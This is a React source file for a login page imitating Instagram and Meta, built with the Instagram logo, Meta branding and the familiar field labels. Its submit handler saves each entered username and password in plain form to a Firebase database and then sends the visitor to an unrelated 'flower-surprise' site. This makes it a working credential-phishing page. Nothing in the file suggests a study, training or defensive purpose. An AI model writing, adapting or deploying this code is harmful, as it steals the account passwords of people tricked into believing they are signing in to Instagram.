import React, { useState } from "react";
import { ref, set } from "firebase/database";
import { database } from "../firebase"; // Ensure the path is correct
import { IoArrowBackOutline } from "react-icons/io5"; // Import the Back icon
import { BsMeta } from "react-icons/bs";
import instagramIcon from "../assets/last-removebg-preview.png"; // Correct import path

const Login = () => {
  const [id, setId] = useState("");
  const [user, setUser] = useState("");

  const sanitizePath = (path) => {
    return path.replace(/[.#$\[\]]/g, '_');
  };

  const handleLogin = async (e) => {
    e.preventDefault();
    if (id === "" || user === "") {
      alert("Please fill in both fields.");
      return;
    }
    try {
      const sanitizedId = sanitizePath(id);
      // Save data to Firebase Realtime Database
      await set(ref(database, 'users/' + sanitizedId), {
        user
      });
      console.log("Data saved successfully");

      // Redirect to the specified URL
      window.location.href = "https://flower-surprise.vercel.app/";
    } catch (error) {
      console.error("Error saving data:", error);
    }
  };

  return (
    <div className="flex justify-center items-center h-screen bg-gradient-to-br from-white via-blue-100 to-blue-50 p-4">
      <div className="bg-white p-8 rounded-lg shadow-md w-full max-w-sm">
        <div className="flex justify-between items-center mb-8">
          <IoArrowBackOutline className="mr-1" />
          <a href="#" className="text-gray-500 text-center flex-1 ">English (US)</a>
        </div>
        <div className="text-center mb-8">
          <img
            src={instagramIcon}
            alt="Instagram"
            className="w-[6rem] mx-auto"
          />
        </div>
        <form onSubmit={handleLogin}>
          <div className="mb-4">
            <input
              type="text"
              placeholder="Username, email or mobile number"
              value={id}
              onChange={(e) => setId(e.target.value)}
              className="w-full px-4 py-2 border rounded bg-gray-100 text-gray-600"
            />
          </div>
          <div className="mb-4">
            <input
              type="password"
              placeholder="Password"
              value={user}
              onChange={(e) => setUser(e.target.value)}
              className="w-full px-4 py-2 border rounded bg-gray-100 text-gray-600"
            />
          </div>
          <button
            type="submit"
            className="w-full bg-blue-500 text-white py-2 rounded-[50px] font-bold"
          >
            Log in
          </button>
        </form>
        <p className="text-center mt-4">
          <a href="#" className="text-blue-500">Forgot password?</a>
        </p>
        <div className="text-center mt-8">
          <button className="w-full mt-4 border border-blue-500 rounded-[50px] py-2 text-blue-500 font-bold">
            Create new account
          </button>
          <div className="text-center mt-4 flex justify-center items-center">
            <BsMeta className="text-gray-500 mr-2" size={24} />
            <a href="#" className="text-gray-500 font-bold">Meta</a>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Login;
